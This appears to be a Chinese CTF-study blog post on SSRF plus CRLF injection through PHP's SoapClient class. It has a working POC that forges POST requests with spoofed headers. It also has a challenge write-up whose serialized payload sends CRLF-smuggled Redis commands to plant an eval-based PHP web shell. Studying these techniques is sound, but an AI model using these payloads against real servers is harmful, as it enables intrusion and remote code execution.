---
title: SoapClient 进行 SSRF + CRLF
date: 2026-08-28 13:20:00
categories:
  - Web安全
tags:
  - SSRF
  - CRLF
  - SoapClient
description: SoapClient 进行 SSRF + CRLF
---


## 0x01 什么是Soap

SOAP是webService三要素（SOAP、WSDL、UDDI）之一：

- WSDL 用来描述如何访问具体的接口。

- UDDI用来管理，分发，查询webService。

- SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。
  其采用HTTP作为底层通讯协议，XML作为数据传送的格式。

## 0x02 PHP中的SoapClient类

参考链接：https://www.php.net/manual/zh/soapclient.soapclient.php

PHP 的 SOAP 扩展可以用来提供和使用 Web Services，这个扩展实现了6个类，其中的SoapClient类是用来创建soap数据报文，与wsdl接口进行交互的，同时这个类下也是有反序列化中常常用到的__call()魔术方法。

该类的构造函数如下：

```
public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）
```

第一个参数是用来指明是否是wsdl模式。

第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。

![在这里插入图片描述](/img/ctf/soapclient-ssrf-crlf-001.png)

知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。

我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url，如下

```php
<?php
$a = new SoapClient(null, array('location' => "http://xxx.xxx.xxx",
                                     'uri'      => "123"));
echo serialize($a);
?>
```

当把上述脚本得到的序列化串进行反序列化（unserialize），并执行一个SoapClient没有的成员函数时，会自动调用该类的__Call方法，然后向target_url发送一个soap请求，并且uri选项是我们可控的地方。

## 0x03 CRLF Injection

CRLF是”回车 + 换行”(\r\n)的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。

参考链接：
CRLF Injection漏洞的利用与实例分析https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html

## 0x04 SSRF+CRLF攻击内网

实际上很多时候都需要这两个漏洞配合在一起使用，当我们我们可以从外网调用到soap的api，而攻击目标是在内网，那么就可以利用SoapClient进行SSRF攻击内网，然后配合CRLF构造POST请求增加我们的攻击面。

那么为什么在用SoapClient类进行SSRF的时候会有CRLF注入的问题呢？如下：

![在这里插入图片描述](/img/ctf/soapclient-ssrf-crlf-002.png)

可以看到options参数中还有一个选项为user_agent，运行我们自己设置User-Agent的值。

当我们可以控制User-Agent的值时，也就意味着我们完全可以构造一个POST请求，因为Content-Type为和Content-Length都在User-Agent之下，而控制这两个是利用CRLF发送post请求最关键的地方。

最后给出wupco师傅的生成任意POST报文的POC:

```php
<?php
$target = 'http://123.206.216.198/bbb.php';
$post_string = 'a=b&flag=aaa';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: xxxx=1234'
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^','%0d%0a',$aaa);
$aaa = str_replace('&','%26',$aaa);
echo $aaa;
?>

```

原文链接：https://blog.csdn.net/qq_42181428/article/details/100569464

# 真的是反序列化(利用SoapClient触发__call用ssrf来打Redis)

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

//hint: Redis20251206

class pure{
    public $web;
    public $misc;
    public $crypto;
    public $pwn;

    public function __construct($web, $misc, $crypto, $pwn){
        $this->web = $web;
        $this->misc = $misc;
        $this->crypto = $crypto;
        $this->pwn = $pwn;
    }

    public function reverse(){
        $this->pwn = new $this->web($this->misc, $this->crypto);
    }

    public function osint(){
        $this->pwn->play_0xGame();
    }

    public function __destruct(){
        $this->reverse();
        $this->osint();
    }
}

$AI = $_GET['ai'];

$ctf = unserialize($AI);

?>
```

发现没有POP链，但注意到这边 $this->pwn->play_0xGame(); 引⽤了⼀个不存在的函

数，可以想到⽤SoapClient类，刚好访问不存在的函数可以触发它⾥⾯的 __call() ，⽽且hint写

了 Redis20251206 ，很明显是⽤SoapClientSSRF来打Redis，⽽后⾯的20251206就是Redis的密码

📌

***\*利用SoapClient类进行SSRF+CRLF攻击:\****

https://blog.csdn.net/qq_42181428/article/details/100569464

***\*soap导致的SSRF\****:

https://xz.aliyun.com/news/2640

```php
<?php
class pure
{
public $web;
public $misc;
public $crypto;
public $pwn;
}
$a = new pure();
$a->web = 'SoapClient';
$a->misc = null;
$target = 'http://127.0.0.1:6379/';
$poc = "AUTH 20251206\r\nCONFIG SET dir /var/www/html/\r\nCONFIG SET
dbfilename shell.php\r\nSET x '<?= @eval(\$_POST[1]) ?>'\r\nSAVE";
$a->crypto = array('location' => $target, 'uri' => "hello\"\r\n" . $poc .
"\r\nhello");
echo urlencode(serialize($a));
```

然后蚁剑连接后env即可